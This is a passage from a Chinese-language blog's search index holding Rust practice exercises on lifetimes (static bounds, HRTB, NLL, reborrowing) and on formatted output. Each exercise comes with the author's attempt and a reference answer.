i32 = 18;// 返回常量 `Num` 的引用，注意，这里的生命周期从 `&#x27;static` 强转为 `&#x27;a`fn coerce_static&lt;&#x27;a&gt;(_: &amp;&#x27;a i32) -&gt; &amp;&#x27;a i32 &#123; &amp;NUM&#125;fn main() &#123; &#123; let lifetime_num = 9; let coerced_static = coerce_static(&amp;lifetime_num); println!(&quot;coerced_static: &#123;&#125;&quot;, coerced_static); &#125; println!(&quot;NUM: &#123;&#125; stays accessible!&quot;, NUM);&#125; T: ‘static关于 &#39;static 的特征约束详细解释，请参见 Rust 语言圣经，这里就不再赘述。 🌟🌟 1234567891011121314151617181920212223242526272829/* 让代码工作 */use std::fmt::Debug;fn print_it&lt;T: Debug + &#x27;static&gt;( input: T) &#123; println!( &quot;&#x27;static value passed in is: &#123;:?&#125;&quot;, input );&#125;fn print_it1( input: impl Debug + &#x27;static ) &#123; println!( &quot;&#x27;static value passed in is: &#123;:?&#125;&quot;, input );&#125;fn print_it2&lt;T: Debug + &#x27;static&gt;( input: &amp;T) &#123; println!( &quot;&#x27;static value passed in is: &#123;:?&#125;&quot;, input );&#125;fn main() &#123; // i 是有所有权的数据，并没有包含任何引用，因此它是 &#x27;static let i = 5; print_it(i); // 但是 &amp;i 是一个引用，生命周期受限于作用域，因此它不是 &#x27;static print_it(&amp;i); print_it1(&amp;i); // 但是下面的代码可以正常运行 ! print_it2(&amp;i);&#125; Answer 1234567891011121314151617181920212223242526272829use std::fmt::Debug;fn print_it&lt;T: Debug + &#x27;static&gt;( input: T) &#123; println!( &quot;&#x27;static value passed in is: &#123;:?&#125;&quot;, input );&#125;fn print_it1( input: impl Debug + &#x27;static ) &#123; println!( &quot;&#x27;static value passed in is: &#123;:?&#125;&quot;, input );&#125;fn print_it2&lt;T: Debug + &#x27;static&gt;( input: &amp;T) &#123; println!( &quot;&#x27;static value passed in is: &#123;:?&#125;&quot;, input );&#125;fn main() &#123; // i is owned and contains no references, thus it&#x27;s &#x27;static: const i:i32 = 5; print_it(i); // oops, &amp;i only has the lifetime defined by the scope of // main(), so it&#x27;s not &#x27;static: print_it(&amp;i); print_it1(&amp;i); // but this one WORKS ! print_it2(&amp;i);&#125; 🌟🌟🌟 123456789101112131415161718192021222324252627282930313233343536373839404142434445use std::fmt::Display;fn main() &#123; let mut string = &quot;First&quot;.to_owned(); string.push_str(string.to_uppercase().as_str()); print_a(&amp;string); print_b(&amp;string); print_c(&amp;string); // Compilation error print_d(&amp;string); // Compilation error print_e(&amp;string); print_f(&amp;string); print_g(&amp;string); // Compilation error&#125;fn print_a&lt;T: Display + &#x27;static&gt;(t: &amp;T) &#123; println!(&quot;&#123;&#125;&quot;, t);&#125;fn print_b&lt;T&gt;(t: &amp;T)where T: Display + &#x27;static,&#123; println!(&quot;&#123;&#125;&quot;, t);&#125;fn print_c(t: &amp;&#x27;static dyn Display) &#123; println!(&quot;&#123;&#125;&quot;, t)&#125;fn print_d(t: &amp;&#x27;static impl Display) &#123; println!(&quot;&#123;&#125;&quot;, t)&#125;fn print_e(t: &amp;(dyn Display + &#x27;static)) &#123; println!(&quot;&#123;&#125;&quot;, t)&#125;fn print_f(t: &amp;(impl Display + &#x27;static)) &#123; println!(&quot;&#123;&#125;&quot;, t)&#125;fn print_g(t: &amp;&#x27;static String) &#123; println!(&quot;&#123;&#125;&quot;, t);&#125; Answer 123456789101112131415161718192021222324252627282930313233343536373839404142434445use std::fmt::Display;fn main() &#123; let mut string = &quot;First&quot;.to_owned(); string.push_str(string.to_uppercase().as_str()); print_a(&amp;string); print_b(&amp;string); print_c(Box::leak(Box::new(string.clone()))); // Compilation error print_d(Box::leak(Box::new(string.clone()))); // Compilation error print_e(&amp;string); print_f(&amp;string); print_g(Box::leak(Box::new(string))); // Compilation error&#125;fn print_a&lt;T: Display + &#x27;static&gt;(t: &amp;T) &#123; println!(&quot;&#123;&#125;&quot;, t);&#125;fn print_b&lt;T&gt;(t: &amp;T) where T: Display + &#x27;static,&#123; println!(&quot;&#123;&#125;&quot;, t);&#125;fn print_c(t: &amp;&#x27;static dyn Display) &#123; println!(&quot;&#123;&#125;&quot;, t)&#125;fn print_d(t: &amp;&#x27;static impl Display) &#123; println!(&quot;&#123;&#125;&quot;, t)&#125;fn print_e(t: &amp;(dyn Display + &#x27;static)) &#123; println!(&quot;&#123;&#125;&quot;, t)&#125;fn print_f(t: &amp;(impl Display + &#x27;static)) &#123; println!(&quot;&#123;&#125;&quot;, t)&#125;fn print_g(t: &amp;&#x27;static String) &#123; println!(&quot;&#123;&#125;&quot;, t);&#125; 深入生命周期特征约束就像泛型类型可以有约束一样，生命周期也可以有约束 ，如下所示： T: &#39;a，所有引用在 T 必须超过生命周期 &#39;a T: Trait + &#39;a: T 必须实现特征 Trait 并且所有引用在 T 必须超过生命周期 &#39;a 示例 123456789101112131415161718192021222324252627282930use std::fmt::Debug; // 特征约束使用#[derive(Debug)]struct Ref&lt;&#x27;a, T: &#x27;a&gt;(&amp;&#x27;a T);// `Ref` 包含对泛型类型 `T` 的引用，该泛型类型具有// 未知的生命周期 `&#x27;a`. `T` 是约定任何// 引用在 `T` 必须大于 `&#x27;a` 。此外，在生命周期// 里 `Ref` 不能超过 `&#x27;a`。// 使用 `Debug` 特征打印的通用函数。fn print&lt;T&gt;(t: T) where T: Debug &#123; println!(&quot;`print`: t is &#123;:?&#125;&quot;, t);&#125;// 这里引用 `T` 使用 where `T` 实现// `Debug` 和所有引用 `T` 都要比 `&#x27;a` 长// 此外，`&#x27;a`必须要比函数声明周期长fn print_ref&lt;&#x27;a, T&gt;(t: &amp;&#x27;a T) where T: Debug + &#x27;a &#123; println!(&quot;`print_ref`: t is &#123;:?&#125;&quot;, t);&#125;fn main() &#123; let x = 7; let ref_x = Ref(&amp;x); print_ref(&amp;ref_x); print(ref_x);&#125; 🌟 1234567891011/* 使用生命周期注释结构体1. `r` 和 `s` 必须是不同生命周期2. `s` 的生命周期需要大于 &#x27;r&#x27;*/struct DoubleRef&lt;T&gt; &#123; r: &amp;T, s: &amp;T&#125;fn main() &#123; println!(&quot;Success!&quot;)&#125; My Answer 1234567891011/* 使用生命周期注释结构体1. `r` 和 `s` 必须是不同生命周期2. `s` 的生命周期需要大于 &#x27;r&#x27;*/struct DoubleRef&lt;&#x27;a,&#x27;b:&#x27;a,T&gt; &#123; r: &amp;&#x27;a T, s: &amp;&#x27;b T&#125;fn main() &#123; println!(&quot;Success!&quot;)&#125; Answer 1234567struct DoubleRef&lt;&#x27;a,&#x27;b:&#x27;a, T&gt; &#123; r: &amp;&#x27;a T, s: &amp;&#x27;b T&#125;fn main() &#123; println!(&quot;Success!&quot;)&#125; 🌟🌟 123456789101112131415/* 添加类型约束使下面代码正常运行 */struct ImportantExcerpt&lt;&#x27;a&gt; &#123; part: &amp;&#x27;a str,&#125;impl&lt;&#x27;a, &#x27;b&gt; ImportantExcerpt&lt;&#x27;a&gt; &#123; fn announce_and_return_part(&amp;&#x27;a self, announcement: &amp;&#x27;b str) -&gt; &amp;&#x27;b str &#123; println!(&quot;Attention please: &#123;&#125;&quot;, announcement); self.part &#125;&#125;fn main() &#123; println!(&quot;Success!&quot;)&#125; My Answer 123456789101112131415/* 添加类型约束使下面代码正常运行 */struct ImportantExcerpt&lt;&#x27;a&gt; &#123; part: &amp;&#x27;a str,&#125;impl&lt;&#x27;a:&#x27;b, &#x27;b&gt; ImportantExcerpt&lt;&#x27;a&gt; &#123; fn announce_and_return_part(&amp;&#x27;a self, announcement: &amp;&#x27;b str) -&gt; &amp;&#x27;b str &#123; println!(&quot;Attention please: &#123;&#125;&quot;, announcement); self.part &#125;&#125;fn main() &#123; println!(&quot;Success!&quot;)&#125; Answer 1234567891011121314struct ImportantExcerpt&lt;&#x27;a&gt; &#123; part: &amp;&#x27;a str,&#125;impl&lt;&#x27;a: &#x27;b, &#x27;b&gt; ImportantExcerpt&lt;&#x27;a&gt; &#123; fn announce_and_return_part(&amp;&#x27;a self, announcement: &amp;&#x27;b str) -&gt; &amp;&#x27;b str &#123; println!(&quot;Attention please: &#123;&#125;&quot;, announcement); self.part &#125;&#125;fn main() &#123; println!(&quot;Success!&quot;)&#125; 🌟🌟 123456789/* 添加类型约束使下面代码正常运行 */fn f&lt;&#x27;a, &#x27;b&gt;(x: &amp;&#x27;a i32, mut y: &amp;&#x27;b i32) &#123; y = x; let r: &amp;&#x27;b &amp;&#x27;a i32 = &amp;&amp;0; &#125;fn main() &#123; println!(&quot;Success!&quot;)&#125; Answer 1234567fn f&lt;&#x27;a, &#x27;b&gt;(x: &amp;&#x27;a i32, mut y: &amp;&#x27;b i32) where &#x27;a: &#x27;b &#123; y = x; // &amp;&#x27;a i32 is a subtype of &amp;&#x27;b i32 because &#x27;a: &#x27;b let r: &amp;&#x27;b &amp;&#x27;a i32 = &amp;&amp;0; // &amp;&#x27;b &amp;&#x27;a i32 is well formed because &#x27;a: &#x27;b&#125;fn main() &#123; println!(&quot;Success!&quot;)&#125; HRTB（更高等级特征约束）(Higher-ranked trait bounds)类型约束可能在生命周期中排名更高。这些约束指定了一个约束对于所有生命周期都为真。例如，诸如此类的约束 for&lt;&#39;a&gt; &amp;&#39;a T: PartialEq&lt;i32&gt; 需要如下实现： 123impl&lt;&#x27;a&gt; PartialEq&lt;i32&gt; for &amp;&#x27;a T &#123; // ...&#125; 然后可以用于将一个 &amp;&#39;a T 与任何生命周期进行比较 i32 。 这里只能使用更高级别的约束，因为引用的生命周期比函数上任何可能的生命周期参数都短。 🌟🌟🌟 123456789/* 添加 HRTB 使下面代码正常运行！ */fn call_on_ref_zero&lt;&#x27;a, F&gt;(f: F) where F: Fn(&amp;&#x27;a i32) &#123; let zero = 0; f(&amp;zero);&#125;fn main() &#123; println!(&quot;Success!&quot;)&#125; My Answer 123456789/* 添加 HRTB 使下面代码正常运行！ */fn call_on_ref_zero&lt;F&gt;(f: F) where F: Fn(&amp; i32) &#123; let zero = 0; f(&amp;zero);&#125;fn main() &#123; println!(&quot;Success!&quot;)&#125; Answer 12345678fn call_on_ref_zero&lt;F&gt;(f: F) where for&lt;&#x27;a&gt; F: Fn(&amp;&#x27;a i32) &#123; let zero = 0; f(&amp;zero);&#125;fn main() &#123; println!(&quot;Success!&quot;)&#125; 1234fn call_on_ref_zero&lt;F&gt;(f: F) where F: for&lt;&#x27;a&gt; Fn(&amp;&#x27;a i32) &#123; let zero = 0; f(&amp;zero);&#125; NLL（非词汇生命周期）(Non-Lexical Lifetime)在解释 NLL 之前，我们先看一段代码： 12345678910fn main() &#123; let mut s = String::from(&quot;hello&quot;); let r1 = &amp;s; let r2 = &amp;s; println!(&quot;&#123;&#125; and &#123;&#125;&quot;, r1, r2); let r3 = &amp;mut s; println!(&quot;&#123;&#125;&quot;, r3);&#125; 根据我们目前的知识，这段代码会因为违反 Rust 中的借用规则而导致错误。 但是，如果您执行 cargo run ，那么一切都没问题，那么这里发生了什么？ 编译器在作用域结束之前判断不再使用引用的能力称为 非词法生命周期（简称 NLL ）。 有了这种能力，编译器就知道最后一次使用引用是什么时候，并根据这些知识优化借用规则。 12345678910111213141516171819#![allow(unused)]fn main() &#123;let mut u = 0i32;let mut v = 1i32;let mut w = 2i32;// lifetime of `a` = α ∪ β ∪ γlet mut a = &amp;mut u; // --+ α. lifetime of `&amp;mut u` --+ lexical &quot;lifetime&quot; of `&amp;mut u`,`&amp;mut u`, `&amp;mut w` and `a`use(a); // | |*a = 3; // &lt;-----------------+ |... // |a = &amp;mut v; // --+ β. lifetime of `&amp;mut v` |use(a); // | |*a = 4; // &lt;-----------------+ |... // |a = &amp;mut w; // --+ γ. lifetime of `&amp;mut w` |use(a); // | |*a = 5; // &lt;-----------------+ &lt;--------------------------+&#125; 再借用学习了 NLL 之后，我们现在可以很容易地理解再借用了。 示例 12345678910111213141516171819202122232425#[derive(Debug)]struct Point &#123; x: i32, y: i32,&#125;impl Point &#123; fn move_to(&amp;mut self, x: i32, y: i32) &#123; self.x = x; self.y = y; &#125;&#125;fn main() &#123; let mut p = Point &#123; x: 0, y: 0 &#125;; let r = &amp;mut p; // 这里是再借用 let rr: &amp;Point = &amp;*r; println!(&quot;&#123;:?&#125;&quot;, rr); // 这里结束再借用 // 再借用结束，现在我们可以继续使用 `r` r.move_to(10, 10); println!(&quot;&#123;:?&#125;&quot;, r);&#125; 🌟🌟 1234567891011/* 通过重新排序一些代码使下面代码正常运行 */fn main() &#123; let mut data = 10; let ref1 = &amp;mut data; let ref2 = &amp;mut *ref1; *ref1 += 1; *ref2 += 2; println!(&quot;&#123;&#125;&quot;, data);&#125; My Answer 1234567891011/* 通过重新排序一些代码使下面代码正常运行 */fn main() &#123; let mut data = 10; let ref1 = &amp;mut data; *ref1 += 1; let ref2 = &amp;mut *ref1; *ref2 += 2; println!(&quot;&#123;&#125;&quot;, data);&#125; Answer 12345678910fn main() &#123; let mut data = 10; let ref1 = &amp;mut data; let ref2 = &amp;mut *ref1; *ref2 += 2; *ref1 += 1; println!(&quot;&#123;&#125;&quot;, data);&#125; 未约束的生命周期]在 Nomicon - Unbounded Lifetimes 中查看更多信息。 更多省略规则1234567891011#![allow(unused)]fn main() &#123;impl&lt;&#x27;a&gt; Reader for BufReader&lt;&#x27;a&gt; &#123; // &#x27;a 在以下方法中不使用&#125;// 可以写为：impl Reader for BufReader&lt;&#x27;_&gt; &#123;&#125;&#125; 123456789101112#![allow(unused)]fn main() &#123;// Rust 2015struct Ref&lt;&#x27;a, T: &#x27;a&gt; &#123; field: &amp;&#x27;a T&#125;// Rust 2018struct Ref&lt;&#x27;a, T&gt; &#123; field: &amp;&#x27;a T&#125;&#125; 艰难的练习 🌟🌟🌟🌟 1234567891011121314151617181920212223242526272829303132333435363738394041424344/* 使下面代码正常运行 */struct Interface&lt;&#x27;a&gt; &#123; manager: &amp;&#x27;a mut Manager&lt;&#x27;a&gt;&#125;impl&lt;&#x27;a&gt; Interface&lt;&#x27;a&gt; &#123; pub fn noop(self) &#123; println!(&quot;interface consumed&quot;); &#125;&#125;struct Manager&lt;&#x27;a&gt; &#123; text: &amp;&#x27;a str&#125;struct List&lt;&#x27;a&gt; &#123; manager: Manager&lt;&#x27;a&gt;,&#125;impl&lt;&#x27;a&gt; List&lt;&#x27;a&gt; &#123; pub fn get_interface(&amp;&#x27;a mut self) -&gt; Interface &#123; Interface &#123; manager: &amp;mut self.manager &#125; &#125;&#125;fn main() &#123; let mut list = List &#123; manager: Manager &#123; text: &quot;hello&quot; &#125; &#125;; list.get_interface().noop(); println!(&quot;Interface should be dropped here and the borrow released&quot;); use_list(&amp;list);&#125;fn use_list(list: &amp;List) &#123; println!(&quot;&#123;&#125;&quot;, list.manager.text);&#125; Answer 1234567891011121314151617181920212223242526272829303132333435363738394041424344/* 使下面代码正常运行 */struct Interface&lt;&#x27;a&gt; &#123; manager: &amp;&#x27;a mut Manager&lt;&#x27;a&gt;&#125;impl&lt;&#x27;a&gt; Interface&lt;&#x27;a&gt; &#123; pub fn noop(self) &#123; println!(&quot;interface consumed&quot;); &#125;&#125;struct Manager&lt;&#x27;a&gt; &#123; text: &amp;&#x27;a str&#125;struct List&lt;&#x27;a&gt; &#123; manager: Manager&lt;&#x27;a&gt;,&#125;impl&lt;&#x27;a&gt; List&lt;&#x27;a&gt; &#123; pub fn get_interface(&amp;&#x27;a mut self) -&gt; Interface &#123; Interface &#123; manager: &amp;mut self.manager &#125; &#125;&#125;fn main() &#123; let mut list = List &#123; manager: Manager &#123; text: &quot;hello&quot; &#125; &#125;; list.get_interface().noop(); println!(&quot;Interface should be dropped here and the borrow released&quot;); use_list(&amp;list);&#125;fn use_list(list: &amp;List) &#123; println!(&quot;&#123;&#125;&quot;, list.manager.text);&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"Rust","slug":"编程语言/Rust","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/"},{"name":"练习实践","slug":"编程语言/Rust/练习实践","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/%E7%BB%83%E4%B9%A0%E5%AE%9E%E8%B7%B5/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"http://example.com/tags/Rust/"}]},{"title":"Rust学习 练习13 格式化输出","slug":"Rust学习-练习13-格式化输出","date":"2023-09-26T00:47:04.000Z","updated":"2023-09-26T01:38:07.077Z","comments":true,"path":"2023/09/26/Rust学习-练习13-格式化输出/","link":"","permalink":"http://example.com/2023/09/26/Rust%E5%AD%A6%E4%B9%A0-%E7%BB%83%E4%B9%A013-%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA/","excerpt":"位置参数1.🌟🌟 1234567/* 填空 */fn main() &#123; println!(&quot;&#123;0&#125;, this is &#123;1&#125;. &#123;1&#125;, this is &#123;0&#125;&quot;, &quot;Alice&quot;, &quot;Bob&quot;);// =&gt; Alice, this is Bob. Bob, this is Alice assert_eq!(format!(&quot;&#123;1&#125;&#123;0&#125;&quot;, 1, 2), __); assert_eq!(format!(__, 1, 2), &quot;2112&quot;); println!(&quot;Success!&quot;);&#125;","text":"位置参数1.🌟🌟 1234567/* 填空 */fn main() &#123; println!(&quot;&#123;0&#125;, this is &#123;1&#125;. &#123;1&#125;, this is &#123;0&#125;&quot;, &quot;Alice&quot;, &quot;Bob&quot;);// =&gt; Alice, this is Bob. Bob, this is Alice assert_eq!(format!(&quot;&#123;1&#125;&#123;0&#125;&quot;, 1, 2), __); assert_eq!(format!(__, 1, 2), &quot;2112&quot;); println!(&quot;Success!&quot;);&#125; My Answer 1234567/* 填空 */fn main() &#123; println!(&quot;&#123;0&#125;, this is &#123;1&#125;. &#123;1&#125;, this is &#123;0&#125;&quot;, &quot;Alice&quot;, &quot;Bob&quot;);// =&gt; Alice, this is Bob. Bob, this is Alice assert_eq!(format!(&quot;&#123;1&#125;&#123;0&#125;&quot;, 1, 2),&quot;21&quot;); assert_eq!(format!(&quot;&#123;1&#125;&#123;0&#125;&#123;0&#125;&#123;1&#125;&quot;, 1, 2), &quot;2112&quot;); println!(&quot;Success!&quot;);&#125; Answer 1234567/* 填空 */fn main() &#123; println!(&quot;&#123;0&#125;, this is &#123;1&#125;. &#123;1&#125;, this is &#123;0&#125;&quot;, &quot;Alice&quot;, &quot;Bob&quot;);// =&gt; Alice, this is Bob. Bob, this is Alice assert_eq!(format!(&quot;&#123;1&#125;&#123;0&#125;&quot;, 2,1), &quot;12&quot;); assert_eq!(format!(&quot;&#123;1&#125;&#123;0&#125;&#123;&#125;&#123;&#125;&quot;, 1, 2), &quot;2112&quot;); println!(&quot;Success!&quot;);&#125; 具名参数2.🌟🌟 12345678910111213fn main() &#123; println!(&quot;&#123;argument&#125;&quot;, argument = &quot;test&quot;); // =&gt; &quot;test&quot; /* 填空 */ assert_eq!(format!(&quot;&#123;name&#125;&#123;&#125;&quot;, 1, __), &quot;21&quot;); assert_eq!(format!(__,a = &quot;a&quot;, b = &#x27;b&#x27;, c = 3 ), &quot;a 3 b&quot;); /* 修复错误 */ // 具名参数必须放在其它参数后面 println!(&quot;&#123;abc&#125; &#123;1&#125;&quot;, abc = &quot;def&quot;, 2); println!(&quot;Success!&quot;)&#125; My Answer 12345678910111213fn main() &#123; println!(&quot;&#123;argument&#125;&quot;, argument = &quot;test&quot;); // =&gt; &quot;test&quot; /* 填空 */ assert_eq!(format!(&quot;&#123;name&#125;&#123;&#125;&quot;, 1, name = &quot;2&quot;), &quot;21&quot;); assert_eq!(format!(&quot;&#123;a&#125; &#123;c&#125; &#123;b&#125;&quot;,a = &quot;a&quot;, b = &#x27;b&#x27;, c = 3 ), &quot;a 3 b&quot;); /* 修复错误 */ // 具名参数必须放在其它参数后面 println!(&quot;&#123;abc&#125; &#123;0&#125;&quot;, 2 ,abc = &quot;def&quot;); println!(&quot;Success!&quot;)&#125; Answer 12345678910111213fn main() &#123; println!(&quot;&#123;argument&#125;&quot;, argument = &quot;test&quot;); // =&gt; &quot;test&quot; /* 填空 */ assert_eq!(format!(&quot;&#123;name&#125;&#123;&#125;&quot;, 1, name=2), &quot;21&quot;); assert_eq!(format!(&quot;&#123;a&#125; &#123;c&#125; &#123;b&#125;&quot;,a = &quot;a&quot;, b = &#x27;b&#x27;, c = 3 ), &quot;a 3 b&quot;); /* 修复错误 */ // 具名参数必须放在其它参数后面 println!(&quot;&#123;abc&#125;&#123;&#125;&quot;, 2,abc = &quot;def&quot;); println!(&quot;Success!&quot;)&#125; 字符串对齐3.🌟🌟 默认情况下，通过空格来填充字符串 1234567891011fn main() &#123; // 下面两个都是通过 5 个空格来填充 println!(&quot;Hello &#123;:5&#125;!&quot;, &quot;x&quot;); // =&gt; &quot;Hello x !&quot; println!(&quot;Hello &#123;:1$&#125;!&quot;, &quot;x&quot;, 5); // =&gt; &quot;Hello x !&quot; /* 填空 */ assert_eq!(format!(&quot;Hello __!&quot;, 5, &quot;x&quot;), &quot;Hello x !&quot;); assert_eq!(format!(&quot;Hello __!&quot;, &quot;x&quot;, width = 5), &quot;Hello x !&quot;); println!(&quot;Success!&quot;)&#125; My Answer 1234567891011fn main() &#123; // 下面两个都是通过 5 个空格来填充 println!(&quot;Hello &#123;:5&#125;!&quot;, &quot;x&quot;); // =&gt; &quot;Hello x !&quot; println!(&quot;Hello &#123;:1$&#125;!&quot;, &quot;x&quot;, 5); // =&gt; &quot;Hello x !&quot; /* 填空 */ assert_eq!(format!(&quot;Hello &#123;1:0$&#125;!&quot;, 5, &quot;x&quot;), &quot;Hello x !&quot;); assert_eq!(format!(&quot;Hello &#123;0:width$&#125;!&quot;, &quot;x&quot;, width = 5), &quot;Hello x !&quot;); println!(&quot;Success!&quot;)&#125; Answer 1234567891011fn main() &#123; // 下面两个都是通过 5 个空格来填充 println!(&quot;Hello &#123;:5&#125;!&quot;, &quot;x&quot;); // =&gt; &quot;Hello x !&quot; println!(&quot;Hello &#123;:1$&#125;!&quot;, &quot;x&quot;, 5); // =&gt; &quot;Hello x !&quot; /* 填空 */ assert_eq!(format!(&quot;Hello &#123;1:0$&#125;!&quot;, 5, &quot;x&quot;), &quot;Hello x !&quot;); assert_eq!(format!(&quot;Hello &#123;:width$&#125;!&quot;, &quot;x&quot;, width = 5), &quot;Hello x !&quot;); println!(&quot;Success!&quot;)&#125; 4.🌟🌟🌟 左对齐, 右对齐, 使用指定的字符填充 12345678910111213fn main() &#123; // 左对齐 println!(&quot;Hello &#123;:&lt;5&#125;!&quot;, &quot;x&quot;); // =&gt; Hello x ! // 右对齐 assert_eq!(format!(&quot;Hello __!&quot;, &quot;x&quot;), &quot;Hello x!&quot;); // 居中对齐 assert_eq!(format!(&quot;Hello __!&quot;, &quot;x&quot;), &quot;Hello x !&quot;); // 左对齐，并使用 `&amp;` 填充 assert_eq!(format!(&quot;Hello &#123;:&amp;&lt;5&#125;!&quot;, &quot;x&quot;), __); println!(&quot;Success!&quot;)&#125; My Answer 12345678910111213fn main() &#123; // 左对齐 println!(&quot;Hello &#123;:&lt;5&#125;!&quot;, &quot;x&quot;); // =&gt; Hello x ! // 右对齐 assert_eq!(format!(&quot;Hello &#123;:&gt;5&#125;!&quot;, &quot;x&quot;), &quot;Hello x!&quot;); // 居中对齐 assert_eq!(format!(&quot;Hello &#123;:^5&#125;!&quot;, &quot;x&quot;), &quot;Hello x !&quot;); // 左对齐，并使用 `&amp;` 填充 assert_eq!(format!(&quot;Hello &#123;:&amp;&lt;5&#125;!&quot;, &quot;x&quot;), &quot;Hello x&amp;&amp;&amp;&amp;!&quot;); println!(&quot;Success!&quot;)&#125; Answer 12345678910111213fn main() &#123; // 左对齐 println!(&quot;Hello &#123;:&lt;5&#125;!&quot;, &quot;x&quot;); // =&gt; Hello x ! // 右对齐 assert_eq!(format!(&quot;Hello &#123;:&gt;5&#125;!&quot;, &quot;x&quot;), &quot;Hello x!&quot;); // 居中对齐 assert_eq!(format!(&quot;Hello &#123;:^5&#125;!&quot;, &quot;x&quot;), &quot;Hello x !&quot;); // 左对齐，并使用 `&amp;` 填充 assert_eq!(format!(&quot;Hello &#123;:&amp;&lt;5&#125;!&quot;, &quot;x&quot;), &quot;Hello x&amp;&amp;&amp;&amp;!&quot;); println!(&quot;Success!&quot;)&#125; 5.🌟🌟 我们还能使用 0 来填充数字 1234567891011fn main() &#123; println!(&quot;Hello &#123;:5&#125;!&quot;, 5); // =&gt; Hello 5! println!(&quot;Hello &#123;:+&#125;!&quot;, 5); // =&gt; Hello +5! println!(&quot;Hello &#123;:05&#125;!&quot;, 5); // =&gt; Hello 00005! println!(&quot;Hello &#123;:05&#125;!&quot;, -5); // =&gt; Hello -0005! /* 填空 */ assert!(format!(&quot;&#123;number:0&gt;width$&#125;&quot;, number=1, width=6) == __); println!(&quot;Success!&quot;)&#125; Answer 1234567891011fn main() &#123; println!(&quot;Hello &#123;:5&#125;!&quot;, 5); // =&gt; Hello 5! println!(&quot;Hello &#123;:+&#125;!&quot;, 5); // =&gt; Hello +5! println!(&quot;Hello &#123;:05&#125;!&quot;, 5); // =&gt; Hello 00005! println!(&quot;Hello &#123;:05&#125;!&quot;, -5); // =&gt; Hello -0005! /* 填空 */ assert!(format!(&quot;&#123;number:0&gt;width$&#125;&quot;, number=1, width=6) == &quot;000001&quot;); println!(&quot;Success!&quot;)&#125; 精度6.🌟🌟 浮点数精度 123456789101112/* 填空 */fn main() &#123; let v = 3.1415926; println!(&quot;&#123;:.1$&#125;&quot;, v, 4); // same as &#123;:.4&#125; =&gt; 3.1416 assert_eq!(format!(&quot;__&quot;, v), &quot;3.14&quot;); assert_eq!(format!(&quot;__&quot;, v), &quot;+3.14&quot;); assert_eq!(format!(&quot;__&quot;, v), &quot;3&quot;); println!(&quot;Success!&quot;)&#125; My Answer 123456789101112/* 填空 */fn main() &#123; let v = 3.1415926; println!(&quot;&#123;:.1$&#125;&quot;, v, 4); // same as &#123;:.4&#125; =&gt; 3.1416 assert_eq!(format!(&quot;&#123;:.2&#125;&quot;, v), &quot;3.14&quot;); assert_eq!(format!(&quot;&#123;:+.2&#125;&quot;, v), &quot;+3.14&quot;); assert_eq!(format!(&quot;&#123;:.0&#125;&quot;, v), &quot;3&quot;); println!(&quot;Success!&quot;)&#125; Answer 123456789101112/* 填空 */fn main() &#123; let v = 3.1415926; println!(&quot;&#123;:.1$&#125;&quot;, v, 4); // same as &#123;:.4&#125; =&gt; 3.1416 assert_eq!(format!(&quot;&#123;:.2&#125;&quot;, v), &quot;3.14&quot;); assert_eq!(format!(&quot;&#123;:+.2&#125;&quot;, v), &quot;+3.14&quot;); assert_eq!(format!(&quot;&#123;:.0&#125;&quot;, v), &quot;3&quot;); println!(&quot;Success!&quot;)&#125; 7.🌟🌟🌟 字符串长度 123456789fn main() &#123; let s = &quot;Hello, world!&quot;; println!(&quot;&#123;0:.5&#125;&quot;, s); // =&gt; Hello assert_eq!(format!(&quot;Hello __!&quot;, 3, &quot;abcdefg&quot;), &quot;Hello abc!&quot;); println!(&quot;Success!&quot;)&#125; My Answer 123456789fn main() &#123; let s = &quot;Hello, world!&quot;; println!(&quot;&#123;0:.5&#125;&quot;, s); // =&gt; Hello assert_eq!(format!(&quot;Hello &#123;1:.0$&#125;!&quot;, 3, &quot;abcdefg&quot;), &quot;Hello abc!&quot;); println!(&quot;Success!&quot;)&#125; Answer 123456789fn main() &#123; let s = &quot;Hello, world!&quot;; println!(&quot;&#123;0:.5&#125;&quot;, s); // =&gt; Hello assert_eq!(format!(&quot;Hello &#123;1:.0$&#125;!&quot;, 3, &quot;abcdefg&quot;), &quot;Hello abc!&quot;); println!(&quot;Success!&quot;)&#125; 二进制、八进制、十六进制 format!(“{}”, foo) -&gt; “3735928559” format!(“0x{:X}”, foo) -&gt; “0xDEADBEEF” format!(“0o{:o}”, foo) -&gt; “0o33653337357” 8.🌟🌟 123456789101112fn main() &#123; assert_eq!(format!(&quot;__&quot;, 27), &quot;0b11011&quot;); assert_eq!(format!(&quot;__&quot;, 27), &quot;0o33&quot;); assert_eq!(format!(&quot;__&quot;, 27), &quot;0x1b&quot;); assert_eq!(format!(&quot;__&quot;, 27), &quot;0x1B&quot;); println!(&quot;&#123;:x&#125;!&quot;, 27); // 没有前缀的十六进制 =&gt; 1b println!(&quot;&#123;:#010b&#125;&quot;, 27); // 使用 0 来填充二进制，宽度为 10 =&gt; 0b00011011 println!(&quot;Success!&quot;)&#125; My Answer 123456789101112fn main() &#123; assert_eq!(format!(&quot;&#123;:#b&#125;&quot;, 27), &quot;0b11011&quot;); assert_eq!(format!(&quot;&#123;:#o&#125;&quot;, 27), &quot;0o33&quot;); assert_eq!(format!(&quot;&#123;:#x&#125;&quot;, 27), &quot;0x1b&quot;); assert_eq!(format!(&quot;&#123;:#X&#125;&quot;, 27), &quot;0x1B&quot;); println!(&quot;&#123;:x&#125;!&quot;, 27); // 没有前缀的十六进制 =&gt; 1b println!(&quot;&#123;:#010b&#125;&quot;, 27); // 使用 0 来填充二进制，宽度为 10 =&gt; 0b00011011 println!(&quot;Success!&quot;)&#125; Answer 123456789101112fn main() &#123; assert_eq!(format!(&quot;&#123;:#b&#125;&quot;, 27), &quot;0b11011&quot;); assert_eq!(format!(&quot;&#123;:#o&#125;&quot;, 27), &quot;0o33&quot;); assert_eq!(format!(&quot;&#123;:#x&#125;&quot;, 27), &quot;0x1b&quot;); assert_eq!(format!(&quot;&#123;:#X&#125;&quot;, 27), &quot;0x1B&quot;); println!(&quot;&#123;:x&#125;!&quot;, 27); // 没有前缀的十六进制 =&gt; 1b println!(&quot;&#123;:#010b&#125;&quot;, 27); // 使用 0 